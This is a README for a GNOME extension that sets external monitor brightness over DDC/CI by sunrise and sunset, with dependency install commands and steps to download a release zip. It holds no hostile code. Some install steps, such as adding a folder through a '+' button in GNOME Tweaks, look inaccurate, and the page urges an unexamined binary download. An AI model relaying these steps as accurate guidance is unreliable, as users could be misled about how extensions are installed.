# 🌅 AutoDDC-Brightness - Adjust Monitor Brightness Automatically

## 📥 Download Now
[![Download AutoDDC-Brightness](https://img.shields.io/badge/Download-AutoDDC--Brightness-blue.svg)](https://github.com/ahmedvirus00/AutoDDC-Brightness/releases)

## 🚀 Getting Started

AutoDDC-Brightness is a simple GNOME extension designed to adjust the brightness of external monitors automatically. It uses DDC/CI technology to change brightness based on local sunrise and sunset times. This means you can enjoy optimal screen brightness without manually adjusting it.

## 🎯 Features

- **Automatic Brightness Adjustment:** Changes monitor brightness based on real-time sunrise and sunset data.
- **User-Friendly Interface:** Easy to install and configure, even for non-technical users.
- **Compatibility:** Works well on both Fedora and Ubuntu systems with GNOME.
- **Eco-Friendly:** Reduces eye strain and saves energy by adjusting brightness throughout the day.

## 🛠️ System Requirements

To run AutoDDC-Brightness, ensure your system meets the following requirements:

- **Operating System:** Ubuntu 18.04 or later, or Fedora 30 or later
- **GNOME Version:** 3.34 or later
- **Monitor Support:** Your external monitor must support DDC/CI
- **Dependencies:** Ensure `ddcutil` and `geoclue` are installed

Use your system's package manager to install necessary dependencies. Here are the commands for Ubuntu:

```bash
sudo apt install ddcutil geoclue
```

For Fedora, use:

```bash
sudo dnf install ddcutil geoclue
```

## 📦 Installation Instructions

### Step 1: Visit the Releases Page
To download AutoDDC-Brightness, follow this link to the [Releases page](https://github.com/ahmedvirus00/AutoDDC-Brightness/releases).

### Step 2: Choose a Version
Once you’re on the Releases page, scroll through the latest versions. Click on the version you'd like to download. The latest version is generally recommended.

### Step 3: Download the Extension
You will find a file named `AutoDDC-Brightness_<version>.zip`. Click on it to begin your download.

### Step 4: Install the Extension
After the download is complete, unzip the downloaded file. You will find a folder containing the extension files.

To install the extension, follow these steps:

1. Open GNOME Tweaks. If it's not installed, you can install it via your package manager.
   - For Ubuntu, run: `sudo apt install gnome-tweaks`
   - For Fedora, run: `sudo dnf install gnome-tweaks`

2. Navigate to the "Extensions" section in GNOME Tweaks.

3. Click on the "+" button to add a new extension. 

4. Locate the folder you unzipped and select the `AutoDDC-Brightness` folder.

5. Activate the extension from the GNOME Tweaks interface.

### Step 5: Configure the Settings
Once installed, you may want to configure your settings. Click on the extension's name in the GNOME Tweaks to access options for setting your location. This will help adjust brightness according to local sunrise and sunset times.

## ⚙️ Usage

After installation, the extension will automatically adjust the brightness based on the time of day. You can manually adjust settings through GNOME Tweaks or by accessing the extension settings directly.

### Checking for Errors
If the brightness does not adjust as expected, ensure that:

- Your monitor supports DDC/CI.
- `ddcutil` is installed and functioning correctly.

To test `ddcutil`, run the following command in your terminal:

```bash
ddcutil detect
```

If your monitor appears, the setup was successful.

## 📖 Troubleshooting

1. **Brightness Doesn’t Change:**
   - Ensure DDC/CI is enabled on your monitor.
   - Check the installation of `ddcutil` and `geoclue`.

2. **Unable to Find Your Location:**
   - Confirm your internet connection is active.
   - Enable location services in your system settings.

3. **Extension Not Appearing in GNOME Tweaks:**
   - Ensure the extension folder is correctly placed in the `~/.local/share/gnome-shell/extensions` directory.

## 🌐 Support and Contribution

If you encounter any issues, please report them in the Issues section of the repository. For feature requests, feel free to suggest them.

If you’d like to contribute to the project, fork the repository, make your changes, and submit a pull request.

## 📄 License
AutoDDC-Brightness is licensed under the MIT License. You are free to use, modify, and distribute the code.

For more detailed information, check the LICENSE file in the repository.

## 🙌 Acknowledgements
Special thanks to the developers of DDC/CI technology and the contributors who make this extension possible. We appreciate your support in improving AutoDDC-Brightness.